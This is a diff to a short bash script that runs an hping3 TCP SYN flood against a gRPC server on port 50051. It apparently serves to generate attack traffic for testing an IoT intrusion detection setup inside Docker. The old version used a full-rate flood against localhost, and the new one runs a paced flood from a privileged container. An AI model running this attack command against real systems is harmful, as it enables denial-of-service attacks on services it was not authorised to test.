@@ -1,7 +1,17 @@
 #!/usr/bin/env bash
 set -e
-TARGET="${1:-127.0.0.1}"
-DURATION="${2:-20}"
-echo "=== gRPC TCP SYN Flood / hping3 ==="
-echo "Target: $TARGET Port: 50051 Duration: ${DURATION}s"
-sudo timeout "$DURATION" hping3 -S --flood -p 50051 "$TARGET"
+
+DURATION="${1:-10}"
+INTERVAL="${INTERVAL:-u10000}"
+NETWORK="${NETWORK:-iotdashboardids_iot-net}"
+TARGET="${TARGET:-grpc_server}"
+PORT="${PORT:-50051}"
+
+echo "[gRPC HPING3] Target=${TARGET}:${PORT}, Duration=${DURATION}s, Interval=${INTERVAL}, Network=${NETWORK}"
+
+docker run --rm \
+  --network "${NETWORK}" \
+  --cap-add NET_RAW \
+  --cap-add NET_ADMIN \
+  debian:bookworm-slim \
+  sh -c "apt-get update -qq && apt-get install -y -qq hping3 iputils-ping >/dev/null && timeout ${DURATION} hping3 -S -p ${PORT} -i ${INTERVAL} ${TARGET} || true"
